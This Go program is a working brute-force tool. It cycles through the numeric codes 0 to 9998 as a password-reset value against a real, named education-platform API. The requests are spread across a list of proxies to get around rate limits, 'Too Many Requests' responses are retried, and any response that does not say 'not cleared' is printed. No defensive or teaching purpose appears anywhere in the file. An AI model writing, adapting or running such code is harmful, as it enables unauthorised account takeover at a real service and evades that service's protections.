package main

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"
	"time"
)

func testProxy(proxyStr string) bool {
	proxyURL, err := url.Parse("http://" + proxyStr)
	if err != nil {
		return false
	}

	client := &http.Client{
		Transport: &http.Transport{
			Proxy: http.ProxyURL(proxyURL),
		},
	}

	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()

	req, _ := http.NewRequestWithContext(ctx, "GET", "https://example.com", nil)
	resp, err := client.Do(req)
	if err != nil {
		if strings.Contains(err.Error(), "context deadline exceeded") {
			return false
		}
		return false
	}
	defer resp.Body.Close()
	io.ReadAll(resp.Body)

	return resp.StatusCode == 200
}

func readProxies(file string) ([]string, error) {
	content, err := os.ReadFile(file)
	if err != nil {
		return nil, err
	}

	lines := bytes.Split(content, []byte("\n"))
	proxies := make([]string, 0, len(lines))
	for _, line := range lines {
		trimmed := bytes.TrimSpace(line)
		if len(trimmed) > 0 {
			proxies = append(proxies, string(trimmed))
		}
	}
	return proxies, nil
}

func filterWorkingProxies(proxies []string) []string {
	var wg sync.WaitGroup
	var mu sync.Mutex
	working := make([]string, 0, len(proxies))

	for _, proxy := range proxies {
		wg.Add(1)
		go func(p string) {
			defer wg.Done()
			if testProxy(p) {
				mu.Lock()
				working = append(working, p)
				mu.Unlock()
			} else {
				// fmt.Println("❌ Proxy failed or timed out:", p, "")
			}
		}(proxy)
	}

	wg.Wait()
	return working
}

func main() {
	proxies, err := readProxies("proxies.txt")
	if err != nil {
		panic(err)
	}

	fmt.Println("Testing proxies... ")

	
	proxies = filterWorkingProxies(proxies)
	fmt.Println("Working proxies:", len(proxies), "")

	if len(proxies) == 0 {
		fmt.Println("No working proxies found. Exiting ")
		return
	}

	if len(os.Args) > 1 {
		fmt.Println("First user argument:", os.Args[1])
	}

	totalCodes := 9999
	chunkSize := totalCodes / len(proxies) // divide codes among proxies
	var wg sync.WaitGroup
	sem := make(chan struct{}, 50) // concurrency limit

	for i, proxy := range proxies {
		start := i * chunkSize
		end := start + chunkSize - 1
		if i == len(proxies)-1 {
			end = totalCodes - 1 // make sure last proxy goes to the end
		}

		wg.Add(1)
		go func(proxy string, start, end int) {
			for {
				for code := start; code <= end; code++ {
					sem <- struct{}{} // acquire slot
					err := sendRequest(code, proxy)
					<-sem // release slot
	
					if err != nil {
						if strings.Contains(err.Error(), "context deadline exceeded") {
//							fmt.Println("⏱️ Proxy timed out:", proxy)
							return
						}
					}
				}
			}
		}(proxy, start, end)
	}

	wg.Wait()
}

func sendRequest(code int, proxyStr string) error {
	proxyURL, err := url.Parse("http://" + proxyStr)
	if err != nil {
		return err
	}

	client := &http.Client{
		Transport: &http.Transport{
			Proxy: http.ProxyURL(proxyURL),
		},
	}

	payload := map[string]string{}
	data, _ := json.Marshal(payload)

	for {
		ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
		defer cancel()

		req, _ := http.NewRequestWithContext(ctx, "POST", fmt.Sprintf("https://cs-api.pltw.org/TeamUserName/reset?password=%d", code), bytes.NewBuffer(data))
		req.Header.Set("Content-Type", "application/json")

		resp, err := client.Do(req)
		if err != nil {
			if strings.Contains(err.Error(), "context deadline exceeded") {
				return err // main loop removes proxy
			}
			if strings.Contains(err.Error(), "Too Many Requests") {
				time.Sleep(10 * time.Second)
				continue
			}
			return err
		}

		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()

		if !strings.Contains(string(body), "not cleared") {
			fmt.Println(code, string(body))
		}

		break
	}

	return nil
}
